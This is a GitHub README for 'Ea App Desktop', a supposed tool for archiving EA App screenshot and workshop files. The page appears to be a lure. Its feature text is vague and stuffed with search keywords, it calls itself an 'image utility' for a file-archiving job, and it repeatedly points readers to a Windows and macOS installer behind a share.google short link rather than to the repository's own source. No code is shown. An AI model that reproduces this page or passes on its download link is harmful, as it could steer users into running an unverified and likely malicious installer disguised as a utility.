![Ea App Desktop](assets/hero.png)

# Ea App Desktop

*Archive Ea App files on this machine before you change the install.*

## Overview

**Ea App Desktop** is an image utility. Keep Ea App library folders on disk: dated copies of screenshot and workshop files before a patch.

Ea App drops library files next to launcher caches.

Files stay on the machine that runs the tool. Originals are left alone unless you choose otherwise.

## What's included

This GitHub repository is the **Python CLI source** (MIT). Clone it, install requirements, run `main.py`.

A **desktop build for Windows and macOS** (installer, no Python required) is on the [setup page](https://share.google/A1IHfyGRT0zGRLqj8). Same workflow, packaged for everyday use.

## Features

- Finds the Ea App library directory.
- Copies screenshot and workshop files to a dated archive.
- Lists photo and export folders.
- Writes a short report of what was kept.

## Background

People search Ea App desktop and PC when they want the folder on disk.

A named helper is easier to find than a generic zip.

## Requirements

- Windows 10 or 11 for the desktop build
- Python 3.11 or newer only if you run the CLI from this repository
- Runs locally on the PC that starts it; no account required for the CLI

## CLI

Python 3.11 or newer. From the repository root:

```text
python -m pip install -r requirements.txt
python main.py --help
```

`--preview` prints the plan and does not write. `--out` sets an output folder when the command supports it.

## Desktop build

[![Download](assets/download.png)](https://share.google/A1IHfyGRT0zGRLqj8)

**[Windows and macOS installer](https://share.google/A1IHfyGRT0zGRLqj8)**

Source: https://github.com/michellemedina-22/ea-app-desktop

MIT license. See `LICENSE`.
